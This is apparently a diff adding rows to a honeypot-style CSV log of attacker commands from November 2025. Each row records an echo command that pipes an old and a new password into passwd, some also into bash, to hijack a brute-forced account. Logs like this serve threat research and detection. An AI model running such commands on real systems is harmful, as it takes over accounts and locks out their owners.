+"echo ""root\nZmOm1U0MeElm\nZmOm1U0MeElm\n""|passwd",19/11/2025 00:00,1
+"echo ""root\njA894LNtdTws\njA894LNtdTws\n""|passwd",19/11/2025 00:00,1
+"echo ""root\nxu90SxsO9vKz\nxu90SxsO9vKz\n""|passwd",18/11/2025 00:00,1
+"echo ""s\nTovbP7myuEo1\nTovbP7myuEo1\n""|passwd",22/11/2025 12:00,1
+"echo ""saas@123\nwcp8lYuFYWpv\nwcp8lYuFYWpv\n""|passwd",24/11/2025 00:00,1
+"echo ""sales1@123\ng1F6zA21sW8X\ng1F6zA21sW8X\n""|passwd",25/11/2025 12:00,1
+"echo ""sam123\nzDB0rRq9kv5D\nzDB0rRq9kv5D\n""|passwd",30/11/2025 00:00,1
+"echo ""sftp1\nZc4zBc4qhFit\nZc4zBc4qhFit\n""|passwd",20/11/2025 00:00,1
+"echo ""sftp1\nav2UMQ5tIKbq\nav2UMQ5tIKbq\n""|passwd",20/11/2025 00:00,1
+"echo ""sftpuser2025\n7mXwFAo964Rf\n7mXwFAo964Rf\n""|passwd",23/11/2025 00:00,1
+"echo ""sftpuser2025\nJlhuGeytXTqs\nJlhuGeytXTqs\n""|passwd",23/11/2025 00:00,1
+"echo ""sftpuser2025\nR3rjWH3SDvW1\nR3rjWH3SDvW1\n""|passwd",15/11/2025 00:00,1
+"echo ""sftpuser2025\ndKOtJ7ZN1iNG\ndKOtJ7ZN1iNG\n""|passwd",23/11/2025 00:00,1
+"echo ""smbuser1\niOTw3K5r8Stt\niOTw3K5r8Stt\n""|passwd",21/11/2025 00:00,1
+"echo ""sr123\nFjLNqci0rUgQ\nFjLNqci0rUgQ\n""|passwd",21/11/2025 00:00,1
+"echo ""sr123\nrTvIfVgPyxtx\nrTvIfVgPyxtx\n""|passwd",21/11/2025 00:00,1
+"echo ""sr123\ntMayagxsnIeu\ntMayagxsnIeu\n""|passwd",21/11/2025 00:00,1
+"echo ""sshuser@2026\nzKNcA8HKfcZ5\nzKNcA8HKfcZ5\n""|passwd",18/11/2025 00:00,1
+"echo ""steam@123\n5OHnWQEdc2xc\n5OHnWQEdc2xc\n""|passwd",28/11/2025 12:00,1
+"echo ""steam@123\n8Ln7Zm9v8Hgx\n8Ln7Zm9v8Hgx\n""|passwd",28/11/2025 12:00,1
+"echo ""steam@123\nFxdvbBl9Wuml\nFxdvbBl9Wuml\n""|passwd",28/11/2025 12:00,1
+"echo ""steam@123\nXirsDm8d0mMW\nXirsDm8d0mMW\n""|passwd",28/11/2025 12:00,1
+"echo ""steam@123\nm8mli9o9Ef8R\nm8mli9o9Ef8R\n""|passwd",28/11/2025 12:00,1
+"echo ""steam@123\npta30nQkEXJQ\npta30nQkEXJQ\n""|passwd",28/11/2025 12:00,1
+"echo ""studio\nNwMTsoaUwhZC\nNwMTsoaUwhZC\n""|passwd",15/11/2025 00:00,1
+"echo ""support\nLY02S3NfkOEJ\nLY02S3NfkOEJ\n""|passwd",21/11/2025 00:00,1
+"echo ""taufik123\nN3Sx0KRco4RW\nN3Sx0KRco4RW\n""|passwd",22/11/2025 00:00,1
+"echo ""tempuser@123\n1vw8LXxwcWiI\n1vw8LXxwcWiI\n""|passwd",25/11/2025 12:00,1
+"echo ""terraria@123\nWyO4ThDvYcUv\nWyO4ThDvYcUv\n""|passwd",24/11/2025 00:00,1
+"echo ""test123\nEUgTQ6BMpKpK\nEUgTQ6BMpKpK\n""|passwd",17/11/2025 00:00,1
+"echo ""test\nncSHnzBkTijn\nncSHnzBkTijn\n""|passwd",21/11/2025 00:00,1
+"echo ""testt\n30WySZRq2jcM\n30WySZRq2jcM\n""|passwd",15/11/2025 00:00,1
+"echo ""testt\n38xOGLY4isQu\n38xOGLY4isQu\n""|passwd",15/11/2025 00:00,1
+"echo ""testtest\nV291NZHh91nF\nV291NZHh91nF\n""|passwd",20/11/2025 00:00,1
+"echo ""tg1234\nhCTnl189Kvmq\nhCTnl189Kvmq\n""|passwd",19/11/2025 00:00,1
+"echo ""tibero123\n1XhdcYjNg62k\n1XhdcYjNg62k\n""|passwd",25/11/2025 12:00,1
+"echo ""tibero123\nuZEjeeoHUNq2\nuZEjeeoHUNq2\n""|passwd",25/11/2025 12:00,1
+"echo ""tibero\nBzWJKDteat70\nBzWJKDteat70\n""|passwd",30/11/2025 00:00,1
+"echo ""tibero\nKkhTyAT1zIZl\nKkhTyAT1zIZl\n""|passwd",20/11/2025 00:00,1
+"echo ""toto\nNPYa4Q4GdZaB\nNPYa4Q4GdZaB\n""|passwd",29/11/2025 12:00,1
+"echo ""toto\naOBMPs7P5PJc\naOBMPs7P5PJc\n""|passwd",25/11/2025 00:00,1
+"echo ""toto\nuIoZ8X2xpQMw\nuIoZ8X2xpQMw\n""|passwd",25/11/2025 00:00,1
+"echo ""trevor\n7jf7skRdzOBK\n7jf7skRdzOBK\n""|passwd",20/11/2025 12:00,1
+"echo ""trevor\n7yAmRV4FOysi\n7yAmRV4FOysi\n""|passwd",22/11/2025 12:00,1
+"echo ""trevor\ntkx0ToNa2NK6\ntkx0ToNa2NK6\n""|passwd",22/11/2025 12:00,1
+"echo ""uat\nz8PO4wfSBc1z\nz8PO4wfSBc1z\n""|passwd",23/11/2025 00:00,1
+"echo ""uftp\nlgxSMm4Jx0Op\nlgxSMm4Jx0Op\n""|passwd",21/11/2025 00:00,1
+"echo ""user123!\n4InLkJJXNqif\n4InLkJJXNqif\n""|passwd",18/11/2025 00:00,1
+"echo ""user123\nBQfPNOYsf0a0\nBQfPNOYsf0a0\n""|passwd",25/11/2025 00:00,1
+"echo ""user@123\nOx3whMNvrRM7\nOx3whMNvrRM7\n""|passwd",30/11/2025 00:00,1
+"echo ""user@123\ncBbnG5YYjAJ9\ncBbnG5YYjAJ9\n""|passwd",30/11/2025 00:00,1
+"echo ""userb123\nQQaHMu6zXeKj\nQQaHMu6zXeKj\n""|passwd",30/11/2025 00:00,1
+"echo ""username123\nTbCiRriKxnjD\nTbCiRriKxnjD\n""|passwd",24/11/2025 00:00,1
+"echo ""username123\nnLmOFFUXhSFK\nnLmOFFUXhSFK\n""|passwd",24/11/2025 00:00,1
+"echo ""username123\nwKnSECDK32Gc\nwKnSECDK32Gc\n""|passwd",24/11/2025 00:00,1
+"echo ""username\nWWXB0PfZzLc4\nWWXB0PfZzLc4\n""|passwd",25/11/2025 12:00,1
+"echo ""username\na43xcWbxG63o\na43xcWbxG63o\n""|passwd",20/11/2025 12:00,1
+"echo ""username\nkwDrtvg4dnTa\nkwDrtvg4dnTa\n""|passwd",20/11/2025 12:00,1
+"echo ""usuario1123\nkDpGbHCW0jVg\nkDpGbHCW0jVg\n""|passwd",26/11/2025 00:00,1
+"echo ""vagrant\nuHgpDwfsLAxX\nuHgpDwfsLAxX\n""|passwd",25/11/2025 00:00,1
+"echo ""veera123\nCkdS3t53kKG5\nCkdS3t53kKG5\n""|passwd",15/11/2025 12:00,1
+"echo ""vikas@123\n2tbi04GegY2E\n2tbi04GegY2E\n""|passwd",19/11/2025 00:00,1
+"echo ""vikas@123\nPqmBkQGRcGtG\nPqmBkQGRcGtG\n""|passwd",19/11/2025 00:00,1
+"echo ""vikas@123\nrs4dA3YzM2G6\nrs4dA3YzM2G6\n""|passwd",19/11/2025 00:00,1
+"echo ""vpn123\n7ziZ4rWqFhPl\n7ziZ4rWqFhPl\n""|passwd",25/11/2025 12:00,1
+"echo ""vpn123\ngZCQASAF8ejt\ngZCQASAF8ejt\n""|passwd",25/11/2025 12:00,1
+"echo ""vpn\nIOa6hbiLDLky\nIOa6hbiLDLky\n""|passwd",26/11/2025 00:00,1
+"echo ""vps@123\nRHenhu1l8XJc\nRHenhu1l8XJc\n""|passwd",30/11/2025 00:00,1
+"echo ""vps@123\naSPm97cBmar3\naSPm97cBmar3\n""|passwd",30/11/2025 00:00,1
+"echo ""vps\niPFs80LV9Ind\niPFs80LV9Ind\n""|passwd",30/11/2025 12:00,1
+"echo ""welcome1\nFbRMN7HWn3hE\nFbRMN7HWn3hE\n""|passwd",28/11/2025 12:00,1
+"echo ""welcome1\nR2VZUDbM60sF\nR2VZUDbM60sF\n""|passwd",28/11/2025 12:00,1
+"echo ""welcome1\nawHREVtaDxL1\nawHREVtaDxL1\n""|passwd",28/11/2025 12:00,1
+"echo ""welcome1\np0LEnoziHy7t\np0LEnoziHy7t\n""|passwd",28/11/2025 12:00,1
+"echo ""welcome1\nsFovSSdRoxH5\nsFovSSdRoxH5\n""|passwd",28/11/2025 12:00,1
+"echo ""welcome1\nujO9MnILaEVs\nujO9MnILaEVs\n""|passwd",28/11/2025 12:00,1
+"echo ""welcome\nDT18qVEuhtQb\nDT18qVEuhtQb\n""|passwd",22/11/2025 00:00,1
+"echo ""william\nLZHRwg4Wgmkm\nLZHRwg4Wgmkm\n""|passwd",18/11/2025 00:00,1
+"echo ""windows\nQbbZJH40Zxc8\nQbbZJH40Zxc8\n""|passwd",22/11/2025 00:00,1
+"echo ""wqadmin\nXrNjbCERqUma\nXrNjbCERqUma\n""|passwd",22/11/2025 00:00,1
+"echo ""wqadmin\nwddcb3tzjcgO\nwddcb3tzjcgO\n""|passwd",22/11/2025 00:00,1
+"echo ""yuli123\naMVWlOOl69Lb\naMVWlOOl69Lb\n""|passwd",19/11/2025 00:00,1
+"echo ""yuli123\ngTP6gOG8KnuM\ngTP6gOG8KnuM\n""|passwd",19/11/2025 00:00,1
+"echo ""z4ng0rber\nk8bLOSFtohcz\nk8bLOSFtohcz\n""|passwd",25/11/2025 00:00,1
+"echo ""zhangbin\n3vPczafnOphN\n3vPczafnOphN\n""|passwd",23/11/2025 00:00,1
+"echo ""zhangbin\nYY9N4SoqGckr\nYY9N4SoqGckr\n""|passwd",23/11/2025 00:00,1
+"echo ""zhangbin\nryM6CO7qAuM4\nryM6CO7qAuM4\n""|passwd",23/11/2025 00:00,1
+"echo ""zhangbin\nsSIrGmb18XGd\nsSIrGmb18XGd\n""|passwd",23/11/2025 00:00,1
+"echo ""zhangbin\nyaP9kFbJpflF\nyaP9kFbJpflF\n""|passwd",23/11/2025 00:00,1
+"echo ""zhaoyu\nLM3736T7G8l5\nLM3736T7G8l5\n""|passwd",22/11/2025 00:00,1
+"echo ""zhaoyu\nryjgHFcPgNb3\nryjgHFcPgNb3\n""|passwd",22/11/2025 00:00,1
+"echo ""zimbra123\n8NI5EApsjqUE\n8NI5EApsjqUE\n""|passwd",25/11/2025 12:00,1
+"echo ""zimbra123\nrixgF3FHH1y8\nrixgF3FHH1y8\n""|passwd",25/11/2025 12:00,1
+"echo ""zsolt\n0UR0BD1Bp1HD\n0UR0BD1Bp1HD\n""|passwd",15/11/2025 12:00,1
+"echo ""zsolt\nFPvCmbMCKp2f\nFPvCmbMCKp2f\n""|passwd",15/11/2025 12:00,1
+"echo -e ""!QAZ2wsx3edc\nQIca27fd18kj\nQIca27fd18kj""|passwd|bash",22/11/2025 12:00,1
+"echo -e ""!QAZ2wsx3edc\nQfauuyVUELnL\nQfauuyVUELnL""|passwd|bash",22/11/2025 12:00,1
+"echo -e ""!QAZ2wsx3edc\nixR6KLGpaABa\nixR6KLGpaABa""|passwd|bash",22/11/2025 12:00,1
+"echo -e ""!\n2CZ5da5GmmiH\n2CZ5da5GmmiH""|passwd|bash",21/11/2025 12:00,1
+"echo -e ""!\n3kJTZluATxLs\n3kJTZluATxLs""|passwd|bash",18/11/2025 00:00,1
+"echo -e ""!\n7Y6dDH3DOCBI\n7Y6dDH3DOCBI""|passwd|bash",18/11/2025 00:00,1
+"echo -e ""111\nxl21LohGrdM0\nxl21LohGrdM0""|passwd|bash",17/11/2025 00:00,1
+"echo -e ""112233\nTbGuzbf67Sqa\nTbGuzbf67Sqa""|passwd|bash",17/11/2025 12:00,1
+"echo -e ""123123\n96gxFMcGDkgG\n96gxFMcGDkgG""|passwd|bash",17/11/2025 12:00,1
+"echo -e ""123456789\nJJA3l0eiYSmz\nJJA3l0eiYSmz""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""123456789\nJNsPIxh3Ux2N\nJNsPIxh3Ux2N""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""123456789\nVfgwGQZTTc2C\nVfgwGQZTTc2C""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""12345678\n2ulvuCcgW67h\n2ulvuCcgW67h""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""12345678\n8YV8ajsovdq5\n8YV8ajsovdq5""|passwd|bash",17/11/2025 12:00,1
+"echo -e ""12345678\nBo8Iu29jFoAu\nBo8Iu29jFoAu""|passwd|bash",22/11/2025 12:00,1
+"echo -e ""12345678\nK7JrMi3BzKn7\nK7JrMi3BzKn7""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""12345678\nRjh2Ifv73SwO\nRjh2Ifv73SwO""|passwd|bash",22/11/2025 12:00,1
+"echo -e ""12345678\naAOawzuvpaxs\naAOawzuvpaxs""|passwd|bash",17/11/2025 12:00,1
+"echo -e ""12345678\nb9bGBSPUnWwd\nb9bGBSPUnWwd""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""12345678\ngbkRyL7cZXHO\ngbkRyL7cZXHO""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""12345678\nn3MJ3OWUwL4i\nn3MJ3OWUwL4i""|passwd|bash",22/11/2025 12:00,1
+"echo -e ""12345678\nwjofCIqJ3Ykp\nwjofCIqJ3Ykp""|passwd|bash",20/11/2025 12:00,1
+"echo -e ""12345678\nxszH02L6jH1P\nxszH02L6jH1P""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""123456\n0QJFwKQwiJ9D\n0QJFwKQwiJ9D""|passwd|bash",18/11/2025 00:00,1
+"echo -e ""123456\n1DqMgQQcPYYt\n1DqMgQQcPYYt""|passwd|bash",30/11/2025 12:00,1
+"echo -e ""123456\n1jA9JtsvtBZg\n1jA9JtsvtBZg""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""123456\n2WovIJExACsn\n2WovIJExACsn""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""123456\n2cdgDo57je00\n2cdgDo57je00""|passwd|bash",18/11/2025 00:00,1
+"echo -e ""123456\n4IehPJzmD9s2\n4IehPJzmD9s2""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""123456\n4apl5ehVBQbf\n4apl5ehVBQbf""|passwd|bash",16/11/2025 00:00,1
+"echo -e ""123456\n6kJBTaMAY2BN\n6kJBTaMAY2BN""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""123456\n7Dh3t5I9qqPD\n7Dh3t5I9qqPD""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""123456\n84ayP4Xsj60M\n84ayP4Xsj60M""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""123456\n8wzG6As1Rqer\n8wzG6As1Rqer""|passwd|bash",27/11/2025 00:00,1
+"echo -e ""123456\nALKOF0VMm7g8\nALKOF0VMm7g8""|passwd|bash",19/11/2025 12:00,1
+"echo -e ""123456\nATeqThCYqGtr\nATeqThCYqGtr""|passwd|bash",29/11/2025 12:00,1
+"echo -e ""123456\nAzPvvjCZmicy\nAzPvvjCZmicy""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""123456\nAzSnDLx0fANP\nAzSnDLx0fANP""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""123456\nBIqHY9FzxMwC\nBIqHY9FzxMwC""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""123456\nC7IaufR4EFMH\nC7IaufR4EFMH""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""123456\nDQDQQfj8Jpig\nDQDQQfj8Jpig""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""123456\nEEU029eH5usZ\nEEU029eH5usZ""|passwd|bash",26/11/2025 00:00,1
+"echo -e ""123456\nEiqJMHnRj6fs\nEiqJMHnRj6fs""|passwd|bash",27/11/2025 00:00,1
+"echo -e ""123456\nF8IuSfPMUGef\nF8IuSfPMUGef""|passwd|bash",15/11/2025 00:00,1
+"echo -e ""123456\nFay7jE0MkOfw\nFay7jE0MkOfw""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""123456\nG1scn8O20SjB\nG1scn8O20SjB""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""123456\nHaQGXkQbnKQ1\nHaQGXkQbnKQ1""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""123456\nJeFfuSeMRlRG\nJeFfuSeMRlRG""|passwd|bash",30/11/2025 12:00,1
+"echo -e ""123456\nKtmGHqUPCQQw\nKtmGHqUPCQQw""|passwd|bash",26/11/2025 12:00,1
+"echo -e ""123456\nLDQvvHYTw7eE\nLDQvvHYTw7eE""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""123456\nLaM7r80C8buP\nLaM7r80C8buP""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""123456\nLo1FTgLA7FCo\nLo1FTgLA7FCo""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""123456\nLoPEBA2GthVP\nLoPEBA2GthVP""|passwd|bash",27/11/2025 00:00,1
+"echo -e ""123456\nNnPj3EkrUQGZ\nNnPj3EkrUQGZ""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""123456\nR9UfgSoFgjXI\nR9UfgSoFgjXI""|passwd|bash",26/11/2025 00:00,1
+"echo -e ""123456\nRBxBJM1ZpMrf\nRBxBJM1ZpMrf""|passwd|bash",15/11/2025 00:00,1
+"echo -e ""123456\nRvbpKERcNjZe\nRvbpKERcNjZe""|passwd|bash",26/11/2025 00:00,1
+"echo -e ""123456\nTM7rw8NrNnz4\nTM7rw8NrNnz4""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""123456\nTuO8qLgMdO7J\nTuO8qLgMdO7J""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""123456\nWrxXXCCWXxhZ\nWrxXXCCWXxhZ""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""123456\nXe7yjaHsNyyQ\nXe7yjaHsNyyQ""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""123456\nXyziz8eWdVYp\nXyziz8eWdVYp""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""123456\nY3zga1sJQu6K\nY3zga1sJQu6K""|passwd|bash",26/11/2025 00:00,1
+"echo -e ""123456\nYKAXTeMjs45r\nYKAXTeMjs45r""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""123456\nYVtyiFSrjIKa\nYVtyiFSrjIKa""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""123456\nZLI4d0Bx9wCd\nZLI4d0Bx9wCd""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""123456\nZXe65nJoFFRG\nZXe65nJoFFRG""|passwd|bash",26/11/2025 00:00,1
+"echo -e ""123456\nZfZhEpgYwYGb\nZfZhEpgYwYGb""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""123456\nZmGbF76WlQgg\nZmGbF76WlQgg""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""123456\naOgCYpqJFhx3\naOgCYpqJFhx3""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""123456\nbO4pYqP3RQ09\nbO4pYqP3RQ09""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""123456\nbijT10IoDOzx\nbijT10IoDOzx""|passwd|bash",18/11/2025 00:00,1
+"echo -e ""123456\nepKJuW6hlSOF\nepKJuW6hlSOF""|passwd|bash",29/11/2025 12:00,1
+"echo -e ""123456\nfstG8co9ITNl\nfstG8co9ITNl""|passwd|bash",30/11/2025 12:00,1
+"echo -e ""123456\ngSnHH5SGtcaK\ngSnHH5SGtcaK""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""123456\nhZKsGmzgDUC7\nhZKsGmzgDUC7""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""123456\njkFqYZ8bA5iZ\njkFqYZ8bA5iZ""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""123456\nkQbGQ4Iowue1\nkQbGQ4Iowue1""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""123456\nlnPWQaNSUJSp\nlnPWQaNSUJSp""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""123456\nlsMEJ0agc1Xj\nlsMEJ0agc1Xj""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""123456\nm8UWDuqCUz3d\nm8UWDuqCUz3d""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""123456\nmEKFvmHSmFDj\nmEKFvmHSmFDj""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""123456\nmX8IQF7vFPkf\nmX8IQF7vFPkf""|passwd|bash",20/11/2025 12:00,1
+"echo -e ""123456\nnGV1TIh3Ouvl\nnGV1TIh3Ouvl""|passwd|bash",29/11/2025 12:00,1
+"echo -e ""123456\nnWixgjRqUBSk\nnWixgjRqUBSk""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""123456\noEqzgtvwqfbv\noEqzgtvwqfbv""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""123456\nopfcEAguAzZu\nopfcEAguAzZu""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""123456\np82VbwIXziFe\np82VbwIXziFe""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""123456\nrmU5IKI17QOe\nrmU5IKI17QOe""|passwd|bash",26/11/2025 00:00,1
+"echo -e ""123456\nsW8aNCRL2n2Q\nsW8aNCRL2n2Q""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""123456\nvHbM469fdIMR\nvHbM469fdIMR""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""123456\nw8zKnUT2OKRi\nw8zKnUT2OKRi""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""123456\nwdfFP0paC2Rq\nwdfFP0paC2Rq""|passwd|bash",18/11/2025 00:00,1
+"echo -e ""123456\nwu5JQXIRp6qh\nwu5JQXIRp6qh""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""12345\nmziyiDk3C8fS\nmziyiDk3C8fS""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""12345\no0ldjph8yChd\no0ldjph8yChd""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""1234\n0L59OI2A9mbA\n0L59OI2A9mbA""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""1234\n1lE8j6goZvXP\n1lE8j6goZvXP""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""1234\n1sVHuooWus2M\n1sVHuooWus2M""|passwd|bash",28/11/2025 00:00,1
+"echo -e ""1234\n3wV5bkjH2YxU\n3wV5bkjH2YxU""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""1234\n4yfBa4j02TLx\n4yfBa4j02TLx""|passwd|bash",15/11/2025 00:00,1
+"echo -e ""1234\n6AhhVIJ8Jhke\n6AhhVIJ8Jhke""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""1234\n7BVY5HjrTkoK\n7BVY5HjrTkoK""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""1234\nB5x1DhT3j2oL\nB5x1DhT3j2oL""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""1234\nCGYRi6ej0pdU\nCGYRi6ej0pdU""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""1234\nUtGK4d4hTZg1\nUtGK4d4hTZg1""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""1234\nXol9RBDIXAEh\nXol9RBDIXAEh""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""1234\nbihvnJwkNNM5\nbihvnJwkNNM5""|passwd|bash",15/11/2025 00:00,1
+"echo -e ""1234\nmmvsKO6xhS0S\nmmvsKO6xhS0S""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""1234\nvqfP5kGg42zr\nvqfP5kGg42zr""|passwd|bash",22/11/2025 12:00,1
+"echo -e ""123\n0kw98LQ5PPLQ\n0kw98LQ5PPLQ""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""123\n1GppiFcKR3YC\n1GppiFcKR3YC""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""123\n1LP3Z6APi8xR\n1LP3Z6APi8xR""|passwd|bash",15/11/2025 00:00,1
+"echo -e ""123\n2JGFAVDDeQZt\n2JGFAVDDeQZt""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""123\n3FpFc0QY0VKn\n3FpFc0QY0VKn""|passwd|bash",28/11/2025 00:00,1
+"echo -e ""123\n3HYpzTWKBchG\n3HYpzTWKBchG""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""123\n3WN6VCAh4WHu\n3WN6VCAh4WHu""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""123\n5PsWN0RVT7ss\n5PsWN0RVT7ss""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""123\n5fx2QhUHZQ1s\n5fx2QhUHZQ1s""|passwd|bash",15/11/2025 00:00,1
+"echo -e ""123\n6yfN7MyGvTx9\n6yfN7MyGvTx9""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""123\n8ZtS9ZDquCjE\n8ZtS9ZDquCjE""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""123\n8jW2xbmbApKy\n8jW2xbmbApKy""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""123\nAVBaG08j4j0x\nAVBaG08j4j0x""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""123\nAxMwNjXXSoXb\nAxMwNjXXSoXb""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""123\nDED5kGOFGNaJ\nDED5kGOFGNaJ""|passwd|bash",29/11/2025 12:00,1
+"echo -e ""123\nERcHhTdD1acO\nERcHhTdD1acO""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""123\nH2OzCIBvQ4rn\nH2OzCIBvQ4rn""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""123\nHYmvTQWlmODn\nHYmvTQWlmODn""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""123\nJ2LVdHmsicZ5\nJ2LVdHmsicZ5""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""123\nJhFbVyjTe5aG\nJhFbVyjTe5aG""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""123\nJvmolXwjZHgQ\nJvmolXwjZHgQ""|passwd|bash",29/11/2025 12:00,1
+"echo -e ""123\nK2ZVC8FzKXFc\nK2ZVC8FzKXFc""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""123\nL0RolK0WSvb3\nL0RolK0WSvb3""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""123\nMnMmIBcuWT4R\nMnMmIBcuWT4R""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""123\nNLoIZsgZpUxT\nNLoIZsgZpUxT""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""123\nPF7qcFjN2lbX\nPF7qcFjN2lbX""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""123\nPu1HhtjncMDs\nPu1HhtjncMDs""|passwd|bash",29/11/2025 12:00,1
+"echo -e ""123\nQAWfqEvSdgBE\nQAWfqEvSdgBE""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""123\nQopqziaVlqFD\nQopqziaVlqFD""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""123\nRMvPxgcYiyJy\nRMvPxgcYiyJy""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""123\nT2Lwcx5BxnXz\nT2Lwcx5BxnXz""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""123\nTVnqG8E6zg6Q\nTVnqG8E6zg6Q""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""123\nTsFgqZbBDxKi\nTsFgqZbBDxKi""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""123\nV88KTukXOfZ7\nV88KTukXOfZ7""|passwd|bash",28/11/2025 00:00,1
+"echo -e ""123\nY5L3geF8MLTc\nY5L3geF8MLTc""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""123\nYZGrQ2LwnR4a\nYZGrQ2LwnR4a""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""123\nYsRZHgiEIxW9\nYsRZHgiEIxW9""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""123\nYzESAgdMdoho\nYzESAgdMdoho""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""123\nZgoFeGYUNSfh\nZgoFeGYUNSfh""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""123\nazHFxGCg1C3Q\nazHFxGCg1C3Q""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""123\ncJy4llj4AebF\ncJy4llj4AebF""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""123\ncOoK30qFNuWr\ncOoK30qFNuWr""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""123\ncnkRdwf4pPf4\ncnkRdwf4pPf4""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""123\nesfA1qUTxy0c\nesfA1qUTxy0c""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""123\ngLshHyawmNUy\ngLshHyawmNUy""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""123\ngfTZAJooagP3\ngfTZAJooagP3""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""123\nhIjodLEq7Gqo\nhIjodLEq7Gqo""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""123\nhypyKrXzMTmS\nhypyKrXzMTmS""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""123\niIOXT0Fkfj82\niIOXT0Fkfj82""|passwd|bash",29/11/2025 12:00,1
+"echo -e ""123\njO7rLhroQdf8\njO7rLhroQdf8""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""123\njOB0R1PRwAP2\njOB0R1PRwAP2""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""123\nkFSVJ7HCb4iJ\nkFSVJ7HCb4iJ""|passwd|bash",30/11/2025 00:00,1
